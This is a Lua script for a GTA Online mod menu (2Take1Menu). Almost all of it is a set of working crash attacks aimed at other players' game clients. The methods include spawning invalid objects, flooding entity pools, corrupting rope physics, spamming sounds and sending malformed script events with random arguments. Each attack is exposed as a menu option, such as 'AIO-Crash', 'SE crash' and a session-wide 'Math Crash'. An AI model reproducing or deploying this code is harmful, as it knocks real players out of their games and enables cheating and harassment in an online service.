local rootPath = utils.get_appdata_path("PopstarDevs", "2Take1Menu")
keypath = rootPath.."\\scripts\\data.txt"
local function writename(name,txt)
local namefile = io.open(txt, "w")
		io.output(namefile)
		io.write(name..'\n')
		io.close()
end


local function request_model(h, t)
			if not h then 
				return 
			end
			if not streaming.has_model_loaded(h) then
   				streaming.request_model(h)
    			local time = utils.time_ms() + t
    			while not streaming.has_model_loaded(h) and time > utils.time_ms() do
       				system.wait(5)
   				end
			end
			return streaming.has_model_loaded(h)
		end


local function Cped(type, hash, coords, dir)
			request_model(hash, 300)
			local ped = ped.create_ped(type, hash, coords, dir, true, false)
			streaming.set_model_as_no_longer_needed(hash)
			return ped
		end

local function spawn_vehicle(hash, coords, dir)
	request_model(hash, 1000)
    local car = vehicle.create_vehicle(hash, coords, dir, true, false)
	streaming.set_model_as_no_longer_needed(hash)
	return car
end

local function spawn_obj(hash, coords)
	request_model(hash, 1000)
    local object = object.create_object(hash, pos, true, false)
	streaming.set_model_as_no_longer_needed(hash)
	return object
end
local function bianshen (J)
local hash
hash = J
streaming.request_model(hash)
while(not streaming.has_model_loaded(hash))
do
system.wait(0)
end
player.set_player_model(hash)
streaming.set_model_as_no_longer_needed(hash)
return HANDLER_POP
end

local function get_control_of_entity(h, t)
if not h then 
return
end
if not network.has_control_of_entity(h) then
network.request_control_of_entity(h)
local time = utils.time_ms() + t
while entity.is_an_entity(h) and not network.has_control_of_entity(h) and time > utils.time_ms() do
system.wait(5)
end
end
return network.has_control_of_entity(h)
end



local invalidobjecthash = {
849958566,
-568220328,
2155335200,
1272323782,
1296557055,
29828513,	
2250084685,	
2349112599,
1599985244,	
3523942264,	
3457195100,	
3762929870,	
1016189997,
861098586,	
3245733464,
2494305715,	
671173206,	
3769155529,	
978689073,
100436592,	
3107991431,	
1327834842,
1327834842,
1239708330,
}

function invalidmodelcrashplayer(pid)
local invalidobj = {}
crashplayerpos = player.get_player_coords(pid)
for i , k in pairs(invalidobjecthash) do
invalidobj[i] = object.create_world_object(k,crashplayerpos, true, false)
system.wait(0)
end
system.wait(100)
for i , k in pairs(invalidobjecthash) do
entity.delete_entity(invalidobj[i])
system.wait(0)
end
end

local attachcarhash = {
887537515,
-845979911,
-1700801569,
223258115,
630371791,
-823509173,
1074326203,
444171386,
}

function attachcrashplayer(data)
local attachcar = {}
crashplayerpos = player.get_player_coords(data)
towtruck = spawn_vehicle(0xe5a2d6c6,crashplayerpos,0)
entity.set_entity_god_mode(towtruck,true)
for i , k in pairs(attachcarhash) do
attachcar[i] = spawn_vehicle(k,crashplayerpos,0)
entity.set_entity_god_mode(attachcar[i],true)
entity.attach_entity_to_entity(attachcar[i],towtruck,0, v3(0,0,0),v3(0,0,0), true, true, false, 0, true)
system.wait(0)
end
system.wait(500)
for i , k in pairs(attachcarhash) do
entity.delete_entity(attachcar[i])
system.wait(0)
end
entity.delete_entity(towtruck)
end

function attachcrashplayerbad(data)
badattachpos = v3(0,0,0)
trailer = spawn_vehicle(-1881846085,badattachpos,0)
pedp = player.get_player_ped(data)
cloneped = ped.clone_ped(pedp)
entity.freeze_entity(trailer, true)
entity.freeze_entity(cloneped, true)
entity.set_entity_god_mode(trailer,true)
entity.set_entity_god_mode(cloneped,true)
entity.attach_entity_to_entity(cloneped,trailer,0, v3(0,0,0),v3(0,0,0), true, true, false, 0, true)
crashplayerpos = player.get_player_coords(data)
entity.set_entity_coords_no_offset(trailer,crashplayerpos)
system.wait(100)
entity.set_entity_coords_no_offset(trailer,badattachpos)
end



function poolcrashplayer(pid)
local Michael = {}
local chernobog = {}
local hunter = {}
local wade = {}
local tracy = {}


chernobogposz = player.get_player_coords(pid)
chernobogposz.z = chernobogposz.z + 1010
for i = 0, 90 do
chernobog[i] = spawn_vehicle(-1006919392,chernobogposz,0)
entity.freeze_entity(chernobog[i], true)
system.wait(0)
end

wadepos = player.get_player_coords(pid)
for i = 0, 85 do
wade[i] = Cped(2,0x0D7114C9,wadepos ,0)
entity.set_entity_god_mode(wade[i],true)
entity.freeze_entity(wade[i], true)
system.wait(0)
end
system.wait(2000)
for i = 0, 90 do
entity.delete_entity(wade[i])
system.wait(0)
end
tracypos = player.get_player_coords(pid)
for i = 0, 85 do
tracy[i] = Cped(2,0x0D7114C9,tracypos ,0)
entity.set_entity_god_mode(tracy[i],true)
entity.freeze_entity(tracy[i], true)
system.wait(0)
end
system.wait(2000)
for i = 0, 90 do
entity.delete_entity(tracy[i])
system.wait(0)
end
for i = 0, 90 do
entity.delete_entity(chernobog[i])
system.wait(0)
end

chernobogpos = player.get_player_coords(pid)
for i = 0, 90 do
chernobog[i] = spawn_vehicle(-1006919392,chernobogpos,0)
entity.freeze_entity(chernobog[i], true)
system.wait(0)
end
system.wait(2000)
for i = 0, 90 do
entity.delete_entity(chernobog[i])
system.wait(0)
end


mikepos = player.get_player_coords(pid)
for i = 0, 85 do
Michael[i] = Cped(2,0x0D7114C9,mikepos ,0)
entity.set_entity_god_mode(Michael[i],true)
ped.set_ped_component_variation(Michael[i], 0, 0,9,0 )
entity.freeze_entity(Michael[i], true)
system.wait(0)
end
system.wait(2000)


for i = 0, 85 do
entity.delete_entity(Michael[i])
system.wait(0)
end

end

objecthash = {
314436594, 
352817817,
466911544,
511018606,
519594446,
772023703,
1022953480,
1067874014,
1082797888,
2041665236,
}


function handlercrashplayer(pid)
local spawnobj = {}
local attachcar = {}
pos = player.get_player_coords(pid)
handler = spawn_vehicle(444583674,pos,0)
boneveh = entity.get_entity_bone_index_by_name(handler,"frame_1")
for i , k in pairs(attachcarhash) do
attachcar[i] = spawn_vehicle(k,pos,0)
entity.attach_entity_to_entity(attachcar[i],handler,boneveh, v3(0,0,0),v3(0,0,0), true, true, false, 0, true)
system.wait(0)
end

end


function chernobogcrashplayer(pid)
local chernobog = {}
pos = player.get_player_coords(pid)
chernobogmain = spawn_vehicle(-692292317,pos,0)
for i =0, 90  do
chernobog[i] = spawn_vehicle(-692292317,pos,0)
entity.attach_entity_to_entity(chernobog[i],chernobogmain,0, v3(0,0,0),v3(0,0,0), true, true, false, 0, true)
system.wait(0)
end
system.wait(4000)
for i = 0, 90 do
entity.delete_entity(chernobog[i])
system.wait(0)
end
entity.delete_entity(chernobogmain)
end

function mc()
bianshen(0x705E61F2)
system.wait(100)
ped.set_ped_health(player.get_player_ped(player.player_id()), 0)
system.wait(100)
bianshen(0x9C9EFFD8)
system.wait(100)
ped.set_ped_health(player.get_player_ped(player.player_id()), 0)
system.wait(100)
end

function soundcrashplayer(pid)
 local time = utils.time_ms() + 2000
        while time > utils.time_ms() do
            local netsoundpos = player.get_player_coords(pid)
            for i = 1, 10 do
                audio.play_sound_from_coord(-1, '5s', netsoundpos, 'MP_MISSION_COUNTDOWN_SOUNDSET', true, 10000, false)
            end
            system.wait(0)
        end	
end

function secrashplayer(pid)
script.trigger_script_event(-2113023004, pid, {-1, -1,0,0,-20,1000})
script.trigger_script_event(-1056683619, pid, {-1, -1})
script.trigger_script_event(1757755807, pid, {-1, -1})
script.trigger_script_event(1258808115, pid, {-1, -1})
script.trigger_script_event(-786546101, pid, {-1, -1})	
end

function fakecrash(pid)
pedp = player.get_player_ped(pid)
cloneped = ped.clone_ped(pedp)
ped.clear_ped_tasks_immediately(pedp)
local titlle = "scr_martin1"
local hashid = "scr_sol1_fire_trail"
graphics.set_next_ptfx_asset(titlle)
                while not graphics.has_named_ptfx_asset_loaded(titlle) do
                    graphics.request_named_ptfx_asset(titlle)
                    system.wait(0)
                end
graphics.start_networked_ptfx_looped_on_entity(hashid,pedp, v3(0,0,0.0), v3(0, 0, 0),5)	
end


playeroption = menu.add_player_feature("Player", "parent", 0, function(k, pid)
end)

aio_crash = menu.add_player_feature("AIO-Crash", "action", playeroption.id, function(k, pid)
mypos = player.get_player_coords(player.player_id())
pedmy = player.get_player_ped(player.player_id())
entity.set_entity_coords_no_offset(pedmy, v3(0,0,4000))
entity.freeze_entity(pedmy, true)
for i = 0 ,1 do
fakecrash(pid)
poolcrashplayer(pid)
invalidmodelcrashplayer(pid)
soundcrashplayer(pid)
attachcrashplayer(pid)
secrashplayer(pid)
end
entity.set_entity_coords_no_offset(pedmy, mypos)
entity.freeze_entity(pedmy, false)
end)

bad_para_crash = menu.add_player_feature("Virgin Crash", "action", playeroption.id, function(k, pid)
pos = player.get_player_coords(pid)
cargobob = spawn_vehicle(0XFCFCB68B,pos,0)
vehicle = spawn_vehicle(0X187D938D,pos,0)
newRope = rope.add_rope(pos,v3(0,0,10),1,1,0,1,1,false,false,false,1.0,false)
rope.attach_entities_to_rope(newRope,cargobob,vehicle,entity.get_entity_coords(cargobob),entity.get_entity_coords(vehicle),2 ,0,0,"Center","Center")
system.wait(100)
end)

bad_para_crash = menu.add_player_feature(":D", "action", playeroption.id, function(k, pid)
pos = player.get_player_coords(pid)
pos.x = pos.x + 2
newRope = rope.add_rope(pos,v3(0,0,10),1,1,0,1,1,false,false,false,1.0,false)
pos = player.get_player_coords(pid)
car = spawn_vehicle(0X187D938D,pos,0)
end)

menu.add_player_feature("math crash" , "action",playeroption.id,function(k,pid)
local pos = player.get_player_coords(pid)
local ppos = player.get_player_coords(pid)
pos.x = pos.x+5
ppos.z = ppos.z+1
pedp=player.get_player_ped(pid)
cargobob = spawn_vehicle(    2132890591,pos,0)
kur =Cped(26,2727244247,ppos,0)
entity.set_entity_god_mode(kur,true)
newRope = rope.add_rope(pos,v3(0,0,0),1,1,0.0000000000000000000000000000000000001,1,1,true,true,true,1.0,true)
rope.attach_entities_to_rope(newRope,cargobob,kur,entity.get_entity_coords(cargobob),entity.get_entity_coords(kur),2 ,0,0,"Center","Center")
system.wait(100)
end)

menu.add_player_feature("SE crash" , "action",playeroption.id,function(k,pid)
    script.trigger_script_event(-393294520, pid, {pid, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
    script.trigger_script_event(-1386010354, pid, {pid, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
    script.trigger_script_event(962740265, pid, {pid, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
end)

menu.add_feature("Math Crash" , "action", crashsession, function(k)
    mypos = player.get_player_coords(player.player_id())
    mypos.x = mypos.x+10
    carc = spawn_vehicle(2598821281,mypos,0)
    pedc =Cped(26,2597531625,mypos,0)
    --entity.set_entity_god_mode(carc, true)
    --entity.set_entity_god_mode(pedc, true)
    --entity.set_entity_visible(carc, false)
    --entity.set_entity_visible(pedc, false)
    ropec = rope.add_rope(mypos,v3(0,0,0),1,1,0.00300000000000000000000000000000000000000000000001,1,1,true,true,true,1.0,true)
    rope.attach_entities_to_rope(ropec,carc,pedc,entity.get_entity_coords(carc),entity.get_entity_coords(pedc),2,0,0,"Center","Center")
    system.wait(2500)
    rope.delete_rope(ropec)
    entity.delete_entity(carc)
    entity.delete_entity(pedc)
    menu.notify("La session a bien reçu le crash.", "Math Crash", 10, 0xff0000ff)
end)